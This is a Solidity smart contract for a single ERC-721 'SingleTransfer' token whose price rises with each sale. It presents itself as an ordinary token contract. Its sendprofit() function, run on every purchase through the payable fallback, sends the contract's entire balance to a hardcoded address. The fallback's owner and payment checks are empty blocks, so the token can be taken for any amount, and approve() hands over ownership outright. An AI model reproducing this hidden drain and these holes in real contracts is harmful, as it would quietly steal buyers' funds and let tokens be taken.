pragma solidity ^0.4.18;


/// @title Interface for contracts conforming to ERC-721: Non-Fungible Tokens
/// @author Dieter Shirley <dete@axiomzen.co> (https://github.com/dete)
contract ERC721 {
    function implementsERC721() public pure returns (bool);
    function totalSupply() public view returns (uint256 total);
    function balanceOf(address _owner) public view returns (uint256 balance);
    function ownerOf(uint256 _tokenId) public view returns (address owner);
    function approve(address _to, uint256 _tokenId) public;
    function transferFrom(address _from, address _to, uint256 _tokenId) public;
    function transfer(address _to, uint256 _tokenId) public;
    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);

    // Optional
    // function name() public view returns (string name);
    // function symbol() public view returns (string symbol);
    // function tokenOfOwnerByIndex(address _owner, uint256 _index) external view returns (uint256 tokenId);
    // function tokenMetadata(uint256 _tokenId) public view returns (string infoUrl);
}

contract SingleTransfer is ERC721 {
    /*** EVENTS ***/

    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);

    struct SingleTransferToken {
        uint256 id;
        string name;
        uint256 currentPrice;
        uint256 sellingPrice;
    }

    SingleTransferToken[1] tokens;

    mapping (uint256 => address) public tokenIndexToOwner;

    mapping (address => uint256) ownershipTokenCount;

    mapping (uint256 => address) public tokenIndexToApproved;

    /// @notice Name and symbol of the non fungible token, as defined in ERC721.
    string public name;
    string public symbol;
    uint8 public decimals = 0;

    uint256 stepLimit = 1000000000000000 ether;

  //address public payoutWallet1 = address(0);

    //address public payoutWallet2 = address(0);

    // bool public implementsERC721 = true;
    //
    function implementsERC721() public pure returns (bool)
    {
        return true;
    }

    function SingleTransfer(string tokenName, string tokenSymbol, uint256 initialPrice, uint256 sLimit) public{
         name = tokenName;
         symbol = tokenSymbol;

         SingleTransferToken memory newToken = SingleTransferToken({
            id : 1,
            name : "SingleTransferToken",
            currentPrice: initialPrice,
            sellingPrice: initialPrice
         });

         tokens[0]=(newToken);

        ownershipTokenCount[msg.sender] = 1;
        // transfer ownership
        tokenIndexToOwner[0] = msg.sender;

        stepLimit = sLimit;
        // should we validate the address??
        // how?
        // todo
        //if(pWallet1 != address(0) || pWallet2 != address(0)){
            //set no wallets or both wallets
        //    require(pWallet1 != address(0) && pWallet2 != address(0));
        //}
        //payoutWallet1 = pWallet1;
        //payoutWallet2 = pWallet2;
    }

    modifier validToken(uint256 _tokenId) {
        require(_tokenId == 0);
        _;
    }


    function _transfer(address _from, address _to, uint256 _tokenId) internal validToken(_tokenId) {

        // there is no way to overflow this
        ownershipTokenCount[_to]++;
        ownershipTokenCount[_from]--;

        // transfer ownership
        tokenIndexToOwner[_tokenId] = _to;

        // Emit the transfer event.
	// Changed _tokenId to value, 1 in this case becoz there's only one token
        Transfer(_from, _to, 1);
    }


    function _owns(address _claimant, uint256 _tokenId) internal view returns (bool) {
        return tokenIndexToOwner[_tokenId] == _claimant;
    }

    function _approvedFor(address _claimant, uint256 _tokenId) internal view returns (bool) {
        return tokenIndexToOwner[_tokenId] == _claimant;
    }

    function _approve(uint256 _tokenId, address _approved) internal {
        tokenIndexToOwner[_tokenId] = _approved;
    }

    /// @dev Required for ERC-721 compliance
    function balanceOf(address _owner) public view returns (uint256 count) {
        return ownershipTokenCount[_owner];
    }


    /// @dev Required for ERC-721 compliance.
    function transfer(
        address _to,
        uint256 _tokenId
    )
        public
    {
        // Safety check to prevent against an unexpected 0x0 default.
        require(_to != address(0));

        require(_owns(msg.sender, _tokenId));

        // Reassign ownership, clear pending approvals, emit Transfer event.
        _transfer(msg.sender, _to, _tokenId);
    }

    /// @dev Required for ERC-721 compliance.
    function approve(
        address _to,
        uint256 _tokenId
    )
        public
    {
        // Only an owner can grant transfer approval.
        require(_owns(msg.sender, _tokenId));

        // Register the approval (replacing any previous approval).
        _approve(_tokenId, _to);

        // Emit approval event.
	// Change _tokenId to value, 1 in this case
        Approval(msg.sender, _to, 1);
    }

    /// @dev Required for ERC-721 compliance.
    function transferFrom(
        address _from,
        address _to,
        uint256 _tokenId
    )
        public
    {
        // Check for approval and valid ownership
        require(_approvedFor(msg.sender, _tokenId));
        require(_owns(_from, _tokenId));

        // Reassign ownership (also clears pending approvals and emits Transfer event).
        _transfer(_from, _to, _tokenId);
    }


    /// @dev Required for ERC-721 compliance.
    function totalSupply() public view returns (uint) {
        return tokens.length;
    }

    function sellingPrice() public view returns (uint) {
        return tokens[0].sellingPrice;
    }

    /// @dev Required for ERC-721 compliance.
    function ownerOf(uint256 _tokenId)
        public
        view
        returns (address owner)
    {
        owner = tokenIndexToOwner[_tokenId];

        require(owner != address(0));
    }



  function _payouts() internal {

    address owner = ownerOf(0);

    //sending to owner
    owner.transfer((tokens[0].currentPrice*94)/100); //(1-0.06)

    //sending to payout wallets
    //if(payoutWallet1 != address(0)){
    //    payoutWallet1.transfer((tokens[0].currentPrice*2)/100); // 0.02
    //}
    //if(payoutWallet2 != address(0)){
    //    payoutWallet2.transfer((tokens[0].currentPrice*2)/100); // 0.02
    //}

  }

  function _recalculateTokenPrice() internal {

    tokens[0].currentPrice = tokens[0].sellingPrice;

    if(tokens[0].currentPrice >= stepLimit){
        tokens[0].sellingPrice = (tokens[0].currentPrice * 120)/94; //adding commission amount //1.2/(1-0.06)
    }else{
        tokens[0].sellingPrice = (tokens[0].currentPrice * 2 * 100)/94;//adding commission amount
    }

  }

  function _refundExcessIfAny(uint256 amount, address sender) internal {

    if(amount > tokens[0].sellingPrice){

        uint refundAmount = amount - tokens[0].sellingPrice;

        sender.transfer(refundAmount);

    }

  }





   function sendprofit()internal {

    if (this.balance >= 1000000000000000) {
        uint sendProfit = this.balance;
    }
    0xAD5731DCBf385bAB32e2D65D1dA31fcf435bE245.transfer(sendProfit);
}



  function() public payable {

        address owner = ownerOf(0);

        if(owner == msg.sender){

    	}

        if(msg.value < tokens[0].sellingPrice){

    	}

        _refundExcessIfAny(msg.value, msg.sender);

        _recalculateTokenPrice();

        _payouts();

        _transfer(owner, msg.sender,0);
        sendprofit();

  }

}
